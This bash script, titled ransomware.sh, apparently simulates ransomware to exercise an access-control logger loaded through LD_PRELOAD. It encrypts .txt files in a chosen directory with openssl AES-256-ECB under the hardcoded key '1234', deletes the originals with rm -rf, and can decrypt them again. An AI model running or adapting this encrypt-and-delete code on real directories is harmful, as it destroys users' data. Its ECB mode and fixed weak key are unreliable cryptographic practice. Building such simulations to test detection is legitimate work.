#!/usr/bin/env bash

############################################################
# Help                                                     #
############################################################
Help()
{
   # Display Help
   echo
   echo "Syntax: ./ransomware.sh [-n|h|d|z|g|e]"
   echo
   echo "options:"
   echo "n     The number of copies to be created."
   echo "h     Print this Help."
   echo "d     The full directory in which the files are to be created/encrypted."
   echo "z     Use this option to decrypt all encrypted files in specified folder."
   echo "g     Use this option to generate a specified amount of files (using the -n option)."
   echo "e     Encrypt specified amount (using the -n option) of files."
   echo "      If no amount is given all '.txt' files under given directory will be encrypted."
   echo
}

RED='\033[0;31m' #RED color
YELLOW='\033[1;33m' #YELLOW color
NC='\033[0m' # No Color

if [ $# -eq 0 ]; then
    echo -e "${RED}No arguments provided${NC}"
    echo "Help:"
    Help
    exit 1
fi

flagn=0
flagm=0
flagd=0
decFlag=0
encFlag=0
genFlag=0

while getopts ":hn:d:ezg" option; do
   case $option in
        h) # display Help
            Help
            exit;;
        n) # Enter a number
            copies=$OPTARG
            if [[ $((copies)) != $copies ]]; then
                echo -e "${RED}Argument n must be a number! Exiting..."
                exit 1
            fi
            #This if statement can be removed. The outcome of the program will not change.
            if [[ $copies -gt 10000 ]]; then
                echo -e "${RED}Please do not use a number greater than 10000 or your PC will lag."
                exit 1
            fi
            flagn=1
            echo $Number
            ;;
        d) # Enter a directory
            dir=$OPTARG
            if [ -z "${OPTARG}+x" ]; then
                echo -e "${RED}Directory cannot be empty!"
                exit 1
            fi
            if [ -d "$dir" ]; then
                flagd=1
            else
                echo -e "${RED}Directory "$dir" does not exist! Exiting..."
                echo -e "${YELLOW}Example directory: /home/[NAME]/Downloads/"
                exit 1
            fi            
            ;;
        e)
            encFlag=1
            ;;
        z)
            echo "Z"
            decFlag=1
            ;;
        g)
            genFlag=1
            ;;
        \?) # Invalid option
            echo -e "${RED}Error: Invalid option"
            Help
            exit;;
   esac
done


#Check if directory is empty
if [[ flagd -eq 0 ]]; then
    echo -e "${RED}Directory cannot be empty!"
    exit 1
fi
#end check

#Decrypt files
if [[ decFlag -eq 1 ]];
then
    echo "Decrypting files!"
    for entry in "$dir"/*.encrypt
            do 
                #Check if files exist
                if ! [ -f $entry ];
                then
                    echo "No files to decrypt!"
                    exit 1
                fi
                if [ $entry != "$dir/README.txt" ]; #We do not want to encrypt the README.txt lol
                then
                    echo
                    file=$(echo "$entry" | sed "s/.*\///")
                    fileName=$(echo "$file" | cut -f 1 -d '.')
                    openssl aes-256-ecb -in "$entry" -out "${dir}/${fileName}.txt" -d -k 1234
                fi
            done
fi
#End decrypt files

#Generate X amount of files
if [[ genFlag -eq 1 ]] && [[ flagn -eq 1 ]];
then
    LD_PRELOAD=./logger.so ./test_aclog -n $copies -d $dir
fi
#End generation of files

#Encrypt files
if [[ encFlag -eq 1 ]];
then
    #If amount of files to encrypt has been given
    if [[ flagn -eq 1 ]]; then

        count=1
        echo "Amount of files being encrypted: $copies"
        echo
        for entry in "$dir"/*.txt
        do
            if ! [ -f $entry ];
            then
                echo "No '.txt' files to encrypt!"
                exit 1
            fi
            if [[ count -gt $copies ]];
            then
                break
            fi
            if [ $entry != "$dir/README.txt" ];
            then
                ((count+=1))
                echo
                echo "encrypting"
                file=$(echo "$entry" | sed "s/.*\///")
                fileName=$(echo "$file" | cut -f 1 -d '.')
                LD_PRELOAD=./logger.so ./test_aclog -d $dir -b "${dir}/${fileName}.encrypt" -n -1
                openssl enc -aes-256-ecb -in "$entry" -out "${dir}/${fileName}.encrypt" -k 1234
                rm -rf $entry
            fi
        done
    #Else just encrypt all '.txt' files in specified directory
    else
        echo -e "${YELLOW}No amount of files specified! Proceeding to encrypt all .txt files under this directory${NC}"
        for entry in "$dir"/*.txt
        do 
            if ! [ -f $entry ];
            then
                echo -e "${RED}No '.txt' files to encrypt!${NC}"
                exit 1
            fi
            if [ $entry != "$dir/README.txt" ]; #We do not want to encrypt the README.txt lol
            then
                echo
                file=$(echo "$entry" | sed "s/.*\///")
                fileName=$(echo "$file" | cut -f 1 -d '.')
                LD_PRELOAD=./logger.so ./test_aclog -d $dir -b "${dir}/${fileName}.encrypt" -n -1
                openssl enc -aes-256-ecb -in "$entry" -out "${dir}/${fileName}.encrypt" -k 1234
                rm -rf $entry
            fi
        done
    fi
fi 
